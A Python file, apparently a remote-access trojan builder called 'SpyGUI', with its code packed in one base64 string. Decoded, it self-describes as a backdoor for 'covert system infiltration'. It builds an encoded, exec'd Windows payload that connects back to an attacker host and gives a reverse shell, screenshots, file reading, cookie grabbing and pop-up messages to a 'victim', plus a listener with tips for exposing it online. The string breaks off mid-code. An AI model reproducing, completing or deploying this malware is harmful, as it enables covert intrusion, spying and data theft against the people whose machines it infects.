import os
import base64

script = "cHJpbnQoIlsrXSBTdGFydCBDaGVja2luZyBNb2R1bGUuLi4iKQ0KaW1wb3J0IG9zDQp0cnk6DQogICAgaW1wb3J0IHJhbmRvbQ0KICAgIGltcG9ydCBweWZpZ2xldA0KICAgIGZyb20gcHlmaWdsZXQgaW1wb3J0IEZpZ2xldA0KICAgIGltcG9ydCBjb2xvcmFtYQ0KICAgIGZyb20gY29sb3JhbWEgaW1wb3J0IEZvcmUNCiAgICBmcm9tIGNvbG9yYW1hIGltcG9ydCBTdHlsZQ0KICAgIGltcG9ydCBzb2NrZXQNCiAgICBpbXBvcnQgb3MNCiAgICBpbXBvcnQgYmFzZTY0DQogICAgY29sb3JhbWEuaW5pdCgpDQoNCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICBwcmludChmIkVycm9yIDoge2V9IikNCiAgICBvcy5zeXN0ZW0oJ3BpcDMgaW5zdGFsbCBweWZpZ2xldCcpDQogICAgb3Muc3lzdGVtKCdwaXAzIGluc3RhbGwgY29sb3JhbWEnKQ0KDQp5ZWxsb3cgPSBGb3JlLllFTExPVw0KZ3JlZW4gPSBGb3JlLkdSRUVODQpyZWQgPSBGb3JlLlJFRA0KYmx1ZSA9IEZvcmUuQkxVRQ0KcmVzZXQgPSBTdHlsZS5SRVNFVF9BTEwNCg0KbGhvc3QgPSAiMTI3LjAuMC4xIg0KbHBvcnQgPSA0NDQ0DQpyaG9zdCA9ICIwLjAuMC4wIg0KcnBvcnQgPSA0NDQ0DQpmaWxlX25hbWUgPSAiZGVmYXVsdF9maWxlIg0KDQpieXRlcyA9IHJhbmRvbS5yYW5kaW50KDEwMDAwLCAyMDAwMCkNCg0KZm9udHMgPSBGaWdsZXQoZm9udD0nc2xhbnQnKQ0KcHJpbnQoYmx1ZSArIGZvbnRzLnJlbmRlclRleHQoJ1NweUdVSScpICsgcmVzZXQpDQpwcmludChmIiIiDQpDb3B5cmlnaHQgOiB7eWVsbG93fVBoYW1DaGllbntyZXNldH0NClRlbGVncmFtIDoge3llbGxvd31AYW5vbnltb3VzX3NlY3VyZXN7cmVzZXR9DQoNCkRlc2NyaXB0aW9uIDoNClNweUdVSSBpcyBhIFB5dGhvbi1iYXNlZCBiYWNrZG9vciB0b29sIHdpdGggYSBmaWxlIGZvcm1hdCBpbiBQeXRob24sIGRlc2lnbmVkIGZvciBjb3ZlcnQgc3lzdGVtIGluZmlsdHJhdGlvbi4NCg0KTm90ZSA6DQpPbmNlIGNyZWF0ZWQsIHRoZSBtYWxpY2lvdXMgY29kZSBmaWxlIGNhbiBvbmx5IGJlIGFwcGxpZWQgdG8gY29tcHV0ZXJzIG9yIHdpbmRvd3MNCg0KQ29tbWFuZCAgICAgICAgIERlc2NyaXB0aW9uDQotLS0tLS0tLSAgICAgICAtLS0tLS0tLS0tLS0tDQogaGVscCAgICAgICAgICAgSGVscGluZyBUb29sDQoiIiIpDQp3aGlsZSBUcnVlOg0KICAgIGMyX2lucHV0ID0gaW5wdXQoZiJ7cmVkfXNweWd1aXtyZXNldH0gPiAiKQ0KICAgIGlmIGMyX2lucHV0ID09ICJscG9ydCIgb3IgYzJfaW5wdXQgPT0gImxwb3J0ICI6DQogICAgICAgIGxwb3J0ID0gaW50KGlucHV0KCJTZXQgTFBPUlQgPiAiKSkNCiAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBTZXQgTFBPUlQge2xwb3J0fSBzdWNjZXNzIikNCg0KICAgIGlmIGMyX2lucHV0ID09ICJycG9ydCIgb3IgYzJfaW5wdXQgPT0gInJwb3J0ICI6DQogICAgICAgIHJwb3J0ID0gaW50KGlucHV0KCJTZXQgUlBPUlQgPiAiKSkNCiAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBTZXQgUlBPUlQge3Jwb3J0fSBzdWNjZXNzIikNCg0KICAgIGlmIGMyX2lucHV0ID09ICJyaG9zdCIgb3IgYzJfaW5wdXQgPT0gInJob3N0ICI6DQogICAgICAgIHJob3N0ID0gaW5wdXQoIlNldCBSSE9TVCA+ICIpDQogICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gU2V0IFJIT1NUIHtyaG9zdH0gc3VjY2VzcyIpDQoNCiAgICBpZiBjMl9pbnB1dCA9PSAibGhvc3QiIG9yIGMyX2lucHV0ID09ICJsaG9zdCAiOg0KICAgICAgICBsaG9zdCA9IGlucHV0KCJTZXQgTEhPU1QgPiAiKQ0KICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IFNldCBMSE9TVCB7bGhvc3R9IHN1Y2Nlc3MiKQ0KDQogICAgaWYgYzJfaW5wdXQgPT0gImJ1aWxkIiBvciBjMl9pbnB1dCA9PSAiYnVpbGQgIjoNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgaWYgbm90IGxob3N0Og0KICAgICAgICAgICAgICAgIHByaW50KGYie3JlZH1bLV17cmVzZXR9IFBsZWFzZSBTZXQgTEhPU1QgY29tbWFuZCAnbGhvc3QnLi4uIikNCiAgICAgICAgICAgIGVsaWYgbm90IGxwb3J0Og0KICAgICAgICAgICAgICAgIHByaW50KGYie3JlZH1bLV17cmVzZXR9IFBsZWFzZSBTZXQgTFBPUlQsIGNvbW1hbmQgJ2xwb3J0Jy4uLiIpDQoNCiAgICAgICAgICAgIGlmIG5vdCByaG9zdDoNCiAgICAgICAgICAgICAgICBwcmludChmIntyZWR9Wy1de3Jlc2V0fSBQbGVhc2UgU2V0IFJIT1NULCBjb21tYW5kICdyaG9zdCcuLi4iKQ0KICAgICAgICAgICAgZWxpZiBub3QgcnBvcnQ6DQogICAgICAgICAgICAgICAgcHJpbnQoZiJ7cmVkfVstXXtyZXNldH0gUGxlYXNlIFNldCBSUE9SVCwgY29tbWFuZCAncnBvcnQnLi4uIikNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgZmlsZV9uYW1lID0gaW5wdXQoIlNldCBGaWxlIE5hbWUgPiAiKQ0KICAgICAgICAgICAgcGF5bG9hZCA9IHIiIiINCmltcG9ydCBvcw0KdHJ5Og0KICAgIGltcG9ydCBtc3MNCiAgICBpbXBvcnQgc3lzDQogICAgaW1wb3J0IHNvY2tldA0KICAgIGltcG9ydCBzdWJwcm9jZXNzDQogICAgaW1wb3J0IG9zDQogICAgaW1wb3J0IHB5ZmlnbGV0DQogICAgaW1wb3J0IHBsYXRmb3JtDQogICAgaW1wb3J0IGpzb24NCiAgICBmcm9tIHB5ZmlnbGV0IGltcG9ydCBGaWdsZXQNCmV4Y2VwdDoNCiAgICBpbXBvcnQgb3MNCiAgICBvcy5zeXN0ZW0oJ3BpcDMgaW5zdGFsbCBtc3MnKQ0KICAgIG9zLnN5c3RlbSgncGlwMyBpbnN0YWxsIHB5ZmlnbGV0JykNCg0KaWYgb3MubmFtZSA9PSAibnQiOg0KICAgIHBhc3MNCmVsc2U6DQogICAgcHJpbnQoIlshXSBBbGwgTGludXggb3BlcmF0aW5nIHN5c3RlbXMgY2Fubm90IHVzZSB0aGlzIGZpbGUiKQ0KICAgIHByaW50KCJbIV0gcGxlYXNlIHJ1biBpdCB1c2luZyBhIGNvbXB1dGVyLCBvciB3aW5kb3dzIikNCiAgICBleGl0KCJbIV0gRGVuaWVkIHN1cHBvcnQgd2l0aCBMaW51eCBvcGVyYXRpbmcgc3lzdGVtIikNCg0KZm9udHMgPSBGaWdsZXQoZm9udD0nc2xhbnQnKQ0KcHJpbnQoZm9udHMucmVuZGVyVGV4dCgnU3RhcnRpbmcgU2V0dXAgVG9vbCcpKQ0KcHJpbnQoIlsrXSBTdGFydGluZyBTZXR1cC4uLiIpDQpwcmludCgiV2FpdGluZyAxMC0xNSBtaW4uLi4iKQ0KDQpob3N0ID0gIntyaG9zdH0iDQpwb3J0ID0ge3Jwb3J0fQ0KdHJ5Og0KICAgIHdoaWxlIFRydWU6DQogICAgICAgIHNldHRpbmdzX2Nvbm5lY3QgPSBzb2NrZXQuc29ja2V0KA0KICAgICAgICAgICAgc29ja2V0LkFGX0lORVQsDQogICAgICAgICAgICBzb2NrZXQuU09DS19TVFJFQU0NCiAgICAgICAgKQ0KICAgICAgICBzZXR0aW5nc19jb25uZWN0LmNvbm5lY3QoKGhvc3QsIHBvcnQpKQ0KICAgICAgICBzID0gc2V0dGluZ3NfY29ubmVjdA0KICAgICAgICB3aGlsZSBUcnVlOg0KICAgICAgICAgICAgb3V0cHV0ID0gcy5yZWN2KDkwMjQpDQogICAgICAgICAgICBvdXRwdXRfZGUgPSBvdXRwdXQuZGVjb2RlKCkNCiAgICAgICAgICAgIGlmICJzeXNpbmZvIiBpbiBvdXRwdXRfZGU6DQogICAgICAgICAgICAgICAgZGF0YSA9IHN0cihwbGF0Zm9ybS51bmFtZSgpKQ0KICAgICAgICAgICAgICAgIHMuc2VuZGFsbChkYXRhLmVuY29kZSgpKQ0KDQogICAgICAgICAgICBpZiAic2hlbGwiIGluIG91dHB1dF9kZToNCiAgICAgICAgICAgICAgICB3aGlsZSBUcnVlOg0KICAgICAgICAgICAgICAgICAgICBvcF9kZSA9IHMucmVjdig5MDI0KS5kZWNvZGUoKQ0KDQogICAgICAgICAgICAgICAgICAgIGlmICJleGl0IiBpbiBvcF9kZToNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrDQoNCiAgICAgICAgICAgICAgICAgICAgb3V0cHV0X3NoZWxsID0gc3VicHJvY2Vzcy5Qb3BlbigNCiAgICAgICAgICAgICAgICAgICAgICAgIG9wX2RlLA0KICAgICAgICAgICAgICAgICAgICAgICAgc2hlbGw9VHJ1ZSwNCiAgICAgICAgICAgICAgICAgICAgICAgIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUsDQogICAgICAgICAgICAgICAgICAgICAgICBzdGRpbj1zdWJwcm9jZXNzLlBJUEUsDQogICAgICAgICAgICAgICAgICAgICAgICBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFDQogICAgICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgICAgICAgICAgd29yayA9IG91dHB1dF9zaGVsbC5zdGRvdXQucmVhZCArIG91dHB1dF9zaGVsbC5zdGRlcnIucmVhZCgpDQogICAgICAgICAgICAgICAgICAgIHMuc2VuZGFsbCh3b3JrLmVuY29kZSgpKQ0KDQogICAgICAgICAgICBpZiAibWVzc2VuZ2UiIGluIG91dHB1dF9kZToNCiAgICAgICAgICAgICAgICBsaXN0ZW5fbWVzcyA9IHMucmVjdig5MDI0KQ0KICAgICAgICAgICAgICAgIGJ5dGVfZGVjb2RlID0gbGlzdGVuX21lc3MuZGVjb2RlKCkNCiAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oImVjaG8gPiBzZXR1cC52YnMiKQ0KICAgICAgICAgICAgICAgIHdpdGggb3Blbignc2V0dXAudmJzJywgJ3cnKSBhcyBzYXZlOg0KICAgICAgICAgICAgICAgICAgICBkYXRhID0gJ21zZ2JveCgiJyArIGJ5dGVfZGVjb2RlICsgJyIpJyArICJcbiIgKyAnbXNnYm94KCInICsgYnl0ZV9kZWNvZGUgKyAnIiknDQogICAgICAgICAgICAgICAgICAgIHNhdmUud3JpdGUoZGF0YSkNCiAgICAgICAgICAgICAgICBmb3Igb3Blbl90YWJfbWVzcyBpbiByYW5nZSgxMCk6DQogICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgic2V0dXAudmJzIikNCiAgICAgICAgICAgICAgICBvcy5yZW1vdmUoInNldHVwLnZicyIpDQoNCiAgICAgICAgICAgIGlmICJzY3JlZW5zaG90IiBpbiBvdXRwdXRfZGU6DQogICAgICAgICAgICAgICAgd2l0aCBtc3MubXNzKCkgYXMgc2NyZWVuc2hvdDoNCiAgICAgICAgICAgICAgICAgICAgc2NyZWVuc2hvdC5zaG90KG91dHB1dD0nZGVmYXVsdC5wbmcnKQ0KICAgICAgICAgICAgICAgIHdpdGggb3BlbignZGVmYXVsdC5wbmcnLCAncmInKSBhcyBub3RpX2ZpbGU6DQogICAgICAgICAgICAgICAgICAgIGRhdGEgPSBub3RpX2ZpbGUucmVhZCgpDQogICAgICAgICAgICAgICAgcy5zZW5kYWxsKGRhdGEpDQogICAgICAgICAgICAgICAgb3MucmVtb3ZlKCJkZWZhdWx0LnBuZyIpDQoNCiAgICAgICAgICAgIGlmICJkaXIiIGluIG91dHB1dF9kZToNCiAgICAgICAgICAgICAgICBwYXRoID0gcy5yZWN2KDEwMjQpLmRlY29kZSgpDQogICAgICAgICAgICAgICAgY21kID0gImRpciIsIHBhdGgNCiAgICAgICAgICAgICAgICBzaGVsbF9zdGFydCA9IHN1YnByb2Nlc3MuUG9wZW4oDQogICAgICAgICAgICAgICAgICAgIGNtZCwNCiAgICAgICAgICAgICAgICAgICAgc2hlbGw9VHJ1ZSwNCiAgICAgICAgICAgICAgICAgICAgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwNCiAgICAgICAgICAgICAgICAgICAgc3RkaW49c3VicHJvY2Vzcy5QSVBFLA0KICAgICAgICAgICAgICAgICAgICBzdGRlcnI9c3VicHJvY2Vzcy5QSVBFDQogICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgIGRhdGEgPSBzaGVsbF9zdGFydC5zdGRvdXQucmVhZCgpICsgc2hlbGxfc3RhcnQuc3RkZXJyLnJlYWQoKQ0KICAgICAgICAgICAgICAgIHMuc2VuZChkYXRhKQ0KDQogICAgICAgICAgICBpZiAidXBsb2FkIiBpbiBvdXRwdXRfZGU6DQogICAgICAgICAgICAgICAgcmVhZF9maWxlID0gcy5yZWN2KDEwMDAyNCkNCiAgICAgICAgICAgICAgICBmb3JtYXRzID0gcy5yZWN2KDEwMjQpLmRlY29kZSgpDQogICAgICAgICAgICAgICAgd2l0aCBvcGVuKCJ1cGxvYWRfMTIzLmh0bWwiLCAnd2InKSBhcyBzYXZlOg0KICAgICAgICAgICAgICAgICAgICBzYXZlLndyaXRlKHJlYWRfZmlsZSkNCg0KICAgICAgICAgICAgaWYgIm9wZW4iIGluIG91dHB1dF9kZToNCiAgICAgICAgICAgICAgICBmaWxlID0gcy5yZWN2KDIwMjQpDQogICAgICAgICAgICAgICAgZmlsZSA9IHN0cihmaWxlLmRlY29kZSgpKQ0KICAgICAgICAgICAgICAgIG9zLnN5c3RlbShmaWxlKQ0KDQogICAgICAgICAgICBpZiAiZ2V0IGNvb2tpZSIgaW4gb3V0cHV0X2RlOg0KICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgdXJsID0gcy5yZWN2KDIwMjQpLmRlY29kZSgpDQogICAgICAgICAgICAgICAgICAgIGltcG9ydCByZXF1ZXN0cw0KICAgICAgICAgICAgICAgICAgICBkZWYgZ2V0KCk6DQogICAgICAgICAgICAgICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpDQogICAgICAgICAgICAgICAgICAgICAgICBjb29raWUgPSByZXNwb25zZS5jb29raWVzLmdldF9kaWN0KCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvb2sgPSBjb29raWUNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNvb2s6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAganNvbl9jb29raWUgPSBqc29uLmR1bXBzKGNvb2spDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcy5zZW5kKGpzb25fY29va2llLmVuY29kZSgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzLnNlbmQoYiJbK10gRmFpbGVkIEdldCBDb29raWUiKQ0KICAgICAgICAgICAgICAgICAgICBnZXQoKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICAgICAgcGFzcw0KDQogICAgICAgICAgICBpZiAicHdkIiBpbiBvdXRwdXRfZGU6DQogICAgICAgICAgICAgICAgcGF0aCA9ICJjZCINCiAgICAgICAgICAgICAgICBzaGVsbF9zdGFydCA9IHN1YnByb2Nlc3MuUG9wZW4oDQogICAgICAgICAgICAgICAgICAgIHBhdGgsDQogICAgICAgICAgICAgICAgICAgIHNoZWxsPVRydWUsDQogICAgICAgICAgICAgICAgICAgIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsDQogICAgICAgICAgICAgICAgICAgIHN0ZGluPXN1YnByb2Nlc3MuUElQRSwNCiAgICAgICAgICAgICAgICAgICAgc3RkZXJyPXN1YnByb2Nlc3MuUElQRQ0KICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgICAgICBwID0gc2hlbGxfc3RhcnQuc3Rkb3V0LnJlYWQoKSArIHNoZWxsX3N0YXJ0LnN0ZGVyci5yZWFkKCkNCiAgICAgICAgICAgICAgICBzLnNlbmRhbGwocCkNCg0KICAgICAgICAgICAgaWYgInJlYWQgZmlsZSIgaW4gb3V0cHV0X2RlOg0KICAgICAgICAgICAgICAgIHBhdGggPSBzLnJlY3YoOTAyNCkNCiAgICAgICAgICAgICAgICByZWFkID0gInR5cGUiLCBwYXRoDQogICAgICAgICAgICAgICAgc2hlbGxfc3RhcnQgPSBzdWJwcm9jZXNzLlBvcGVuKA0KICAgICAgICAgICAgICAgICAgICByZWFkLA0KICAgICAgICAgICAgICAgICAgICBzaGVsbD1UcnVlLA0KICAgICAgICAgICAgICAgICAgICBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLA0KICAgICAgICAgICAgICAgICAgICBzdGRpbj1zdWJwcm9jZXNzLlBJUEUsDQogICAgICAgICAgICAgICAgICAgIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUNCiAgICAgICAgICAgICAgICApDQogICAgICAgICAgICAgICAgcCA9IHNoZWxsX3N0YXJ0LnN0ZG91dC5yZWFkKCkgKyBzaGVsbF9zdGFydC5zdGRlcnIucmVhZCgpDQogICAgICAgICAgICAgICAgcy5zZW5kYWxsKHApDQoNCiAgICAgICAgICAgIGlmICJleGl0IiBpbiBvdXRwdXRfZGU6DQogICAgICAgICAgICAgICAgZmlsZV9uYW1lID0gcy5yZWN2KDIwMjQpLmRlY29kZSgpDQogICAgICAgICAgICAgICAgZmlsZSA9IGZpbGVfbmFtZSArICIucHkiDQogICAgICAgICAgICAgICAgb3MucmVtb3ZlKGZpbGUpDQoNCiAgICAgICAgICAgIGlmICJyb3V0ZSIgaW4gb3V0cHV0X2RlOg0KICAgICAgICAgICAgICAgIHJlYWQgPSByIkM6XFdpbmRvd3NcU3lzdGVtMzJcbmV0c3RhdC5leGUiDQogICAgICAgICAgICAgICAgc2hlbGxfc3RhcnQgPSBzdWJwcm9jZXNzLlBvcGVuKA0KICAgICAgICAgICAgICAgICAgICByZWFkLA0KICAgICAgICAgICAgICAgICAgICBzaGVsbD1UcnVlLA0KICAgICAgICAgICAgICAgICAgICBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLA0KICAgICAgICAgICAgICAgICAgICBzdGRpbj1zdWJwcm9jZXNzLlBJUEUsDQogICAgICAgICAgICAgICAgICAgIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUNCiAgICAgICAgICAgICAgICApDQogICAgICAgICAgICAgICAgcCA9IHNoZWxsX3N0YXJ0LnN0ZG91dC5yZWFkKCkgKyBzaGVsbF9zdGFydC5zdGRlcnIucmVhZCgpDQogICAgICAgICAgICAgICAgcy5zZW5kYWxsKHApDQoNCiAgICAgICAgICAgIGlmICJpcGNvbmZpZyIgaW4gb3V0cHV0X2RlOg0KICAgICAgICAgICAgICAgIHJlYWQgPSByIkM6XFdpbmRvd3NcU3lzdGVtMzJcaXBjb25maWcuZXhlIg0KICAgICAgICAgICAgICAgIHNoZWxsX3N0YXJ0ID0gc3VicHJvY2Vzcy5Qb3BlbigNCiAgICAgICAgICAgICAgICAgICAgcmVhZCwNCiAgICAgICAgICAgICAgICAgICAgc2hlbGw9VHJ1ZSwNCiAgICAgICAgICAgICAgICAgICAgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwNCiAgICAgICAgICAgICAgICAgICAgc3RkaW49c3VicHJvY2Vzcy5QSVBFLA0KICAgICAgICAgICAgICAgICAgICBzdGRlcnI9c3VicHJvY2Vzcy5QSVBFDQogICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgIHAgPSBzaGVsbF9zdGFydC5zdGRvdXQucmVhZCgpICsgc2hlbGxfc3RhcnQuc3RkZXJyLnJlYWQoKQ0KICAgICAgICAgICAgICAgIHMuc2VuZGFsbChwKQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBwYXNzDQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgcHJpbnQoZSkNCiAgICBleGl0KCJbK10gU2V0dXAgRXJyb3IiKQ0KIiIiLmZvcm1hdChyaG9zdD1yaG9zdCwgcnBvcnQ9cnBvcnQpDQogICAgICAgICAgICBlbmNvZGVzID0gYmFzZTY0LmI2NGVuY29kZShwYXlsb2FkLmVuY29kZSgpKQ0KICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBTdGFydCBFbmNvZGUgRmlsZS4uLiIpDQogICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IFN0YXJ0IFJhbmRvbSBNdXRleC4uIikNCiAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gU3RhcnQgQnVpbGRpbmcgU29ja2V0Li4uIikNCiAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gU3RhcnQgQnVpbGRpbmcgSnNvbi4uLiIpDQogICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IFN0YXJ0IEJ1aWxkaW5nIEhhbmRsZXIgU2VydmVyLi4uIikNCiAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gTW9kdWxlIElzIE9LIikNCiAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gUGF5bG9hZCA6IHtyZWR9XG57ZW5jb2Rlc317cmVzZXR9IikNCiAgICAgICAgICAgIHBheWxvYWRzID0gZiIiIg0KaW1wb3J0IGJhc2U2NA0KDQpzY3JpcHRfZGUgPSBiYXNlNjQuYjY0ZGVjb2RlKHtlbmNvZGVzfSkuZGVjb2RlKCkNCmV4ZWMoc2NyaXB0X2RlKQ0KIiIiDQogICAgICAgICAgICBvcy5zeXN0ZW0oZidlY2hvID4gLi9idWlsZC97ZmlsZV9uYW1lfS5weScpDQogICAgICAgICAgICBtdXRleCA9IHJhbmRvbS5yYW5kaW50KDEwMCwgOTk5KQ0KICAgICAgICAgICAgbXV0ZXggPSBvcy5zeXN0ZW0oZiJlY2hvIHttdXRleH0gfCBtZDVzdW0iKQ0KICAgICAgICAgICAgd2l0aCBvcGVuKGYiLi9idWlsZC97ZmlsZV9uYW1lfS5weSIsICd3JykgYXMgYnVpbGRzOg0KICAgICAgICAgICAgICAgIGJ5dGVzID0gYnVpbGRzLndyaXRlKHBheWxvYWRzKQ0KICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gTXV0ZXggUmFuZG9tIDoge2dyZWVufXttdXRleH17cmVzZXR9IikNCiAgICAgICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IEZpbGUgTmFtZSA6IHtmaWxlX25hbWV9LnB5IikNCiAgICAgICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IEJ5dGVzIDoge2J5dGVzfSIpDQogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBGaWxlIFNhdmVkIFRvIDogLi9idWlsZC97ZmlsZV9uYW1lfS5weSIuZm9ybWF0KGZpbGVfbmFtZT1maWxlX25hbWUpKQ0KICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICBwcmludChmIntyZWR9Wy1de3Jlc2V0fSBGYWlsZWQgOiIsIGUpDQoNCiAgICBpZiBjMl9pbnB1dCA9PSAiZXhwbG9pdCIgb3IgYzJfaW5wdXQgPT0gImV4cGxvaXQgIiBvciBjMl9pbnB1dCA9PSAicnVuIiBvciBjMl9pbnB1dCA9PSAicnVuICI6DQogICAgICAgIGlmIG5vdCBmaWxlX25hbWU6DQogICAgICAgICAgICBwcmludCgiUGxlYXNlIFNFVCBGSUxFX05BTUUuLi4iKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcyA9IHNvY2tldC5zb2NrZXQoDQogICAgICAgICAgICAgICAgc29ja2V0LkFGX0lORVQsDQogICAgICAgICAgICAgICAgc29ja2V0LlNPQ0tfU1RSRUFNDQogICAgICAgICAgICApDQogICAgICAgICAgICBzLnNldHNvY2tvcHQoDQogICAgICAgICAgICAgICAgc29ja2V0LlNPTF9TT0NLRVQsDQogICAgICAgICAgICAgICAgc29ja2V0LlNPX1JFVVNFQUREUiwNCiAgICAgICAgICAgICAgICAxDQogICAgICAgICAgICApDQogICAgICAgICAgICBzLmJpbmQoKGxob3N0LCBscG9ydCkpDQogICAgICAgICAgICBzLmxpc3RlbigxKQ0KICAgICAgICAgICAgcHJpbnQoIiIpDQogICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IFN0YXJ0aW5nIFNlcnZlciBPbiBQb3J0IiwgbHBvcnQpDQogICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IExpc3RlbiBSZW1vdGUgSG9zdCIsIHJob3N0KQ0KICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBUaXAsIFlvdSBjYW4gdXNlIE5ncm9rIHRvIGJ1ZmZlciBhbmQgcHVibGljaXplIHlvdXIgU2VydmVyIEFkZHJlc3MiKQ0KICAgICAgICAgICAgY29ubiwgYWRkciA9IHMuYWNjZXB0KCkNCiAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0ge2FkZHJbMF19OnthZGRyWzFdfSAtLT4ge2xob3N0fTp7bHBvcnR9IHtieXRlc30gQnl0ZXMiKQ0KICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBTdGFydGluZyBSZXZlcnNlIFNoZWxsIHthZGRyWzBdfTp7YWRkclsxXX0gLS0+IHtsaG9zdH06e2xwb3J0fSB7Ynl0ZXN9IEJ5dGVzIikNCiAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gQ29tbWFuZCAnaGVscCcgZm9yIGhlbHBpbmcgcmV2ZXJzZSBzaGVsbCIpDQogICAgICAgICAgICBwcmludCgiIikNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICB3aGlsZSBUcnVlOg0KICAgICAgICAgICAgICAgICAgICBzaGVsbF9jb21tYW5kID0gaW5wdXQoZiJ7YWRkclswXX06e2FkZHJbMV19QFNweUdVSSA+Pj4gIikNCiAgICAgICAgICAgICAgICAgICAgaWYgc2hlbGxfY29tbWFuZCA9PSAiaGVscCI6DQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiIiINCkNvbW1hbmQgICAgICAgICBEZXNjcmlwdGlvbg0KLS0tLS0tLS0gICAgICAgIC0tLS0tLS0tLS0tLQ0KICBoZWxwICAgICAgICAgICBoZWxwaW5nIHJldmVyc2UNCiAgc2NyZWVuc2hvdCAgICAgc2NyZWVuc2hvdCB2aWN0aW0NCiAgc2hlbGwgICAgICAgICAgc3RhcnQgY29tbWFuZCBwcm9tcHQNCiAgbWVzc2VuZ2UgICAgICAgc2hvdyBtZXNzZW5nZSB0byB2aWN0aW0NCiAgc3lzaW5mbyAgICAgICAgc2hvdyBpbmZvcm1hdGlvbiBjb21wdXRlcg0KICByb3V0ZSAgICAgICAgICBzaG93IHJvdXRlIGFkZHJlc3MNCiAgaXBjb25maWcgICAgICAgU2hvdyBJUCBDb25maWcNCiAgZXhpdCAgICAgICAgICAgZXhpdCByZXZlcnNlDQoNClNoZWxsIENvbW1hbmQNCi0tLS0tLS0tLS0tLS0tDQogIGRpciAgICAgICAgICAgIHNob3cgZmlsZQ0KICB1cGxvYWQgICAgICAgICB1cGxvYWQgZmlsZQ0KICByZWFkIGZpbGUgICAgICBSZWFkZXIgRmlsZQ0KICBwd2QgICAgICAgICAgICBnZXQgcGF0aA0KICBvcGVuICAgICAgICAgICBvcGVuIGZpbGUgZnJvbSB2aWN0aW0NCiAgZ2V0IGNvb2tpZSAgICAgZ2V0IGNvb2tpZSB3ZWIgc2VydmVyDQoiIiIpDQogICAgICAgICAgICAgICAgICAgIGlmIHNoZWxsX2NvbW1hbmQgPT0gImlwY29uZmlnIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25uLnNlbmQoYidpcGNvbmZpZycpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0ID0gY29ubi5yZWN2KDkwMjQpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBQYWNrZXQgU3VjY2VzcyIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQob3V0cHV0LmRlY29kZSgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie3JlZH1bLV17cmVzZXR9IEZhaWxlZCBHZXQgaXBjb25maWciKQ0KDQogICAgICAgICAgICAgICAgICAgIGlmIHNoZWxsX2NvbW1hbmQgPT0gInJvdXRlIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeTo